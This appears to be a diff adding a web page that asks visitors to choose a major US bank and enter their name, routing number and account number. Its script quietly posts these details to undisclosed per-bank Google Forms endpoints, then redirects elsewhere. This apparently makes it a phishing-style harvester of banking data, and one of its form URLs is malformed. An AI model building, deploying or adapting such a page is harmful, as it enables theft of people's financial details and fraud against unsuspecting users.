@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bank Information Submission</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: #ffffff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            text-align: center;
+            color: #333;
+        }
+        label {
+            display: block;
+            margin: 10px 0 5px;
+            color: #555;
+        }
+        input, select {
+            width: calc(100% - 22px);
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #007BFF;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 4px;
+            width: 100%;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Bank Information Submission</h1>
+        <form id="bankForm">
+            <label for="bankSelect">Select Your Bank:</label>
+            <select id="bankSelect" name="bank" required>
+                <option value="" disabled selected>Select a bank</option>
+                <option value="chase">Chase</option>
+                <option value="boa">Bank of America</option>
+                <option value="wellsfargo">Wells Fargo</option>
+                <option value="citibank">Citibank</option>
+                <option value="usbank">US Bank</option>
+                <option value="pnc">PNC</option>
+                <option value="hsbc">HSBC</option>
+                <option value="capitalone">Capital One</option>
+            </select>
+
+            <div id="entryFields" class="hidden">
+                <label for="firstName">First Name:</label>
+                <input type="text" id="firstName" name="firstName" required>
+
+                <label for="lastName">Last Name:</label>
+                <input type="text" id="lastName" name="lastName" required>
+
+                <label for="routingNumber">Routing Number:</label>
+                <input type="text" id="routingNumber" name="routingNumber" required>
+
+                <label for="accountNumber">Account Number:</label>
+                <input type="text" id="accountNumber" name="accountNumber" required>
+
+                <button type="button" onclick="submitForm()">Submit</button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('bankSelect').addEventListener('change', function() {
+            document.getElementById('entryFields').classList.remove('hidden');
+        });
+
+        function submitForm() {
+            var bank = document.getElementById('bankSelect').value;
+            var firstName = document.getElementById('firstName').value;
+            var lastName = document.getElementById('lastName').value;
+            var routingNumber = document.getElementById('routingNumber').value;
+            var accountNumber = document.getElementById('accountNumber').value;
+
+            var urls = {
+                'chase': 'https://docs.google.com/forms/d/e/1FAIpQLSeyGYB_h5Norbt32-AKPknrUyvgg_qO4N58hk6KwZhUyKbFxw/formResponse',
+                'boa': 'https://docs.google.com/forms/d/e/1FAIpQLSfldTsYFwB6sJyNnEUE_NcUrO8Us98FH1zU_QC93Ee-wD-OHw/formResponse',
+                'wellsfargo': 'https://docs.google.com/forms/d/e/1FAIpQLSctodLME2MlcuhwUJ2U_I-91MoFD1EDhN0sSVJ5o0k0UI3Jjg/formResponse',
+                'citibank': 'https://docs.google.com/forms/d/e/1FAIpQLSfVf0B4e3a3TDgExBVoI4USd9i4Df4WJB7l3CsVGTux4EhD5A/formResponse',
+                'usbank': 'https://docs.google.com/forms/d/e/1FAIpQLSeo7AzpUXD7bCFMI8NFsHS0bNvkTXj5MEYwe_WVFDaPO3LNoQ/formResponse',
+                'pnc': 'https://docs.google.com/forms/d/e/1FAIpQLSdQ929PzCrjEJ8fEVbbOKeuguOL06vu9W7YxGPqYBd1Kvd5Og/formResponse',
+                'hsbc': 'https://docs.google.com/forms/d/e/1FAIpQLScSVYhmwRm-A21wyqwiHQvNBE0tguLcScPzBteEs45PcCbAFQ/formResponse',
+                'capitalone': 'https://docs.google.com/1FAIpQLSeXNoyiUu7IJt3_3g24th_TnlivwK8741gQoxkJ4GQZXq8IYg/formResponse'
+            };
+
+            var entryIds = {
+                'chase': {
+                    'firstName': 'entry.150786618',
+                    'lastName': 'entry.1250190927',
+                    'routingNumber': 'entry.780553874',
+                    'accountNumber': 'entry.1111592122'
+                },
+                'boa': {
+                    'firstName': 'entry.678357681',
+                    'lastName': 'entry.348132902',
+                    'routingNumber': 'entry.904086175',
+                    'accountNumber': 'entry.2093457111'
+                },
+                'wellsfargo': {
+                    'firstName': 'entry.2003092164',
+                    'lastName': 'entry.782416939',
+                    'routingNumber': 'entry.1349331841',
+                    'accountNumber': 'entry.1714113112'
+                },
+                'citibank': {
+                    'firstName': 'entry.707024659',
+                    'lastName': 'entry.1509295673',
+                    'routingNumber': 'entry.710555735',
+                    'accountNumber': 'entry.1161331735'
+                },
+                'usbank': {
+                    'firstName': 'entry.911688270',
+                    'lastName': 'entry.873866847',
+                    'routingNumber': 'entry.1664043080',
+                    'accountNumber': 'entry.1513252668'
+                },
+                'pnc': {
+                    'firstName': 'entry.1350857811',
+                    'lastName': 'entry.1364377826',
+                    'routingNumber': 'entry.1180895278',
+                    'accountNumber': 'entry.7880652'
+                },
+                'hsbc': {
+                    'firstName': 'entry.1927936348',
+                    'lastName': 'entry.1691190842',
+                    'routingNumber': 'entry.103822756',
+                    'accountNumber': 'entry.23672128'
+                },
+                'capitalone': {
+                    'firstName': 'entry.1413066258',
+                    'lastName': 'entry.1983938709',
+                    'routingNumber': 'entry.530880653',
+                    'accountNumber': 'entry.1821283963'
+                }
+            };
+
+            var selectedBank = document.getElementById('bankSelect').value;
+            var formUrl = urls[selectedBank];
+            var entryIdsForBank = entryIds[selectedBank];
+
+            if (formUrl && entryIdsForBank) {
+                var formData = new URLSearchParams();
+                
+                for (var key in entryIdsForBank) {
+                    formData.append(entryIdsForBank[key], document.getElementById(key).value);
+                }
+
+                fetch(formUrl, {
+                    method: 'POST',
+                    body: formData,
+                    mode: 'no-cors'
+                }).then(response => {
+                    window.location.href = 'https://docs.google.com/forms/d/e/1FAIpQLSczli-ug8zBtMSQkObBbvZjgAdjbWJJCYorIHM3ax1We_rIXA/viewform?usp=sf_link';
+                }).catch(error => {
+                    console.error('Error:', error);
+                });
+            } else {
+                alert('Please select a bank.');
+            }
+        }
+    </script>
+</body>
+</html>
